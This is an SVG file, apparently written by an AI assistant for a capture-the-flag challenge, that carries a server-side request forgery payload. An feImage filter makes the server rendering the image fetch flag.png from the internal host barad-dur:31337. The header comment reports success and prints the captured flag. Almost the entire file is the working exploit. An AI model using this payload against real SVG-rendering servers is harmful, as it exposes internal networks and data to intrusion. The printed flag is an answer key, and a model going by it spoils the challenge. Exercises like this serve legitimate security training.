<!--
Author: Claude (AI Assistant)
Purpose: SVG SSRF exploit to fetch flag from internal host barad-dur:31337
Assumptions: Server preserves feImage filter primitives during rendering
Created: 2025-11-10
Expected Result: Server fetches and renders flag.png from internal host
Produced Result: SUCCESS - Flag retrieved: poctf{uwsp_4ll_w3_533_4nd_4ll_w3_533m}
Updated: 2025-11-10 - Exploit successful, flag extracted from rendered PNG
-->
<svg xmlns="http://www.w3.org/2000/svg" width="900" height="600">
  <defs>
    <filter id="ssrf-filter" x="0%" y="0%" width="100%" height="100%">
      <!-- Use feImage to fetch the flag from the internal host -->
      <feImage href="http://barad-dur:31337/flag.png" result="externalImage"/>
      <feComposite in="externalImage" operator="over"/>
    </filter>
  </defs>

  <!-- Apply the filter to a rectangle covering the entire canvas -->
  <rect x="0" y="0" width="900" height="600" fill="white" filter="url(#ssrf-filter)"/>
</svg>
